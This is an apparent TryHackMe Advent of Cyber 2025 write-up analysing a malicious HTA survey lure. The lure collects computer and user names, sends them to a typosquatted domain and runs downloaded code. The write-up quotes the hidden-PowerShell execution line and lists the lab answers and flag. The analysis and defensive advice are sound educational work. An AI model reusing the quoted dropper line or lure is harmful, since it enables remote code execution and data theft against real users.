# 🧪 TryHackMe Write-Up  
## Malware Analysis — Malhare.exe (HTA Analysis)  
*(Advent of Cyber 2025 — Day 21)*

---

## 📌 Overview

This challenge focuses on analysing a **malicious HTA (HTML Application) file**
used as part of a social-engineering campaign disguised as an employee salary
survey. The exercise demonstrates how HTA files can serve as **lightweight malware
launchers**, combining HTML, VBScript, and PowerShell to exfiltrate data and
execute remote payloads.

We review the structure of the HTA, identify functions and encoded content, and
trace its execution flow to uncover its malicious behaviour.

---

## 🧩 Room Information

| Field | Details |
|------|--------|
| Platform | TryHackMe |
| Room | Malware Analysis — Malhare.exe |
| Event | Advent of Cyber 2025 |
| Category | Malware / DFIR |
| Difficulty | Intermediate |
| Time | ~60 minutes |
| Status | Completed (100%) |

---

## 🧠 Key Concepts

### 🔹 What Are HTA Files?

HTA files run via **mshta.exe** and behave like desktop applications while using:

- HTML / CSS for UI
- VBScript / JScript for logic
- Built-in Windows tools for execution

Originally designed for **administration & automation**, but often abused for:

- Phishing delivery
- Scripted malware execution
- Downloading payloads
- Living-off-the-land attacks

---

## 🛠 Tools Used

- 📝 Text editor (`pluma`) — to safely inspect the HTA  
- 🧩 CyberChef — decoding & de-obfuscation  
- 🪟 PowerShell — payload and script review  

File analyzed: `survey.hta` (loaded offline for safety)

---

## 🔍 Analysis Workflow

### 🟡 Step 1 — Review Metadata (`<head>`)

The HTA presents itself as a **legitimate employee survey**:

Best Festival Company Developer Survey

➡️ Intent: establish trust via social engineering

---

### 🟡 Step 2 — Identify VBScript Functions

Key functions inside the script:

- `window_onLoad()` → auto-executes on startup  
- `getQuestions()` → downloads “survey questions”
- `provideFeedback()` → collects system info & executes payload
- `decodeBase64()` / `RSBinaryToString()` → decoding routines

---

### 🟡 Step 3 — Detect Suspicious Behavior

HTA abuses:

- `WScript.Network` → gathers **ComputerName & UserName**
- `InternetExplorer.Application` → performs **remote HTTP requests**
- `WScript.Shell` → executes commands

Data exfiltration occurs via:

GET /details


---

### 🟡 Step 4 — Identify Malicious Execution

Downloaded content is not just displayed — it is **executed**:

runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False


✔ Hidden PowerShell  
✔ Executes downloaded payload  
✔ Classic HTA dropper behaviour

---

### 🟡 Step 5 — Examine External Domain

Fake survey domain:

survey.bestfestiivalcompany.com


✔ Typosquatting detected  
❗ Extra **i** in *bestfestiivalcompany*

---

### 🟡 Step 6 — Decode Payload

Payload contained:

- **Base64 encoding**
- Followed by **ROT13 obfuscation**
- Final output revealed the malware flag

---

## 🚩 Answers / Findings

| Question | Answer |
|--------|--------|
| HTA title | **Best Festival Company Developer Survey** |
| Function pretending to download questions | **getQuestions** |
| Malicious survey domain | **survey.bestfestiivalcompany.com** |
| Typosquatting giveaway | **i** |
| Number of survey questions | **4** |
| Fake prize location | **South Pole** |
| Exfiltrated system fields | **ComputerName,UserName** |
| Exfiltration endpoint | **/details** |
| HTTP method used | **GET** |
| Line executing downloaded payload | `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False` |
| Obfuscation encoding | **base64** |
| Additional encoding layer | **rot13** |
| Final flag | `THM{Malware.Analysed}` |

---

## 🧠 Key Learnings

- HTA files are powerful malware carriers via **mshta.exe**
- Social engineering + typosquatting increases trust
- Scripts often hide payloads behind **Base64 + ROT13/XOR**
- Execution patterns reveal malicious intent:
  - hidden PowerShell
  - external HTTP calls
  - in-memory execution chains
- Always analyse suspicious HTA files **offline**

---

## 🛡 Defensive Recommendations

- Block / restrict **mshta.exe** where possible
- Monitor:
  - PowerShell with hidden windows
  - Unexpected outbound HTTP requests
  - Processes spawned from HTA / mshta.exe
- Train users to detect **fake survey lures**
- Implement attachment & content inspection policies

---

## ✅ Conclusion

This challenge demonstrates how seemingly harmless HTA files can be weaponised
to perform **data exfiltration, payload execution, and obfuscation-based evasion**.
Understanding HTA structure and script behaviour is essential for malware
analysts, blue teams, and DFIR responders.

---

## 🔗 Reference

- TryHackMe — *Malware Analysis: Malhare.exe (AoC 2025)*

---
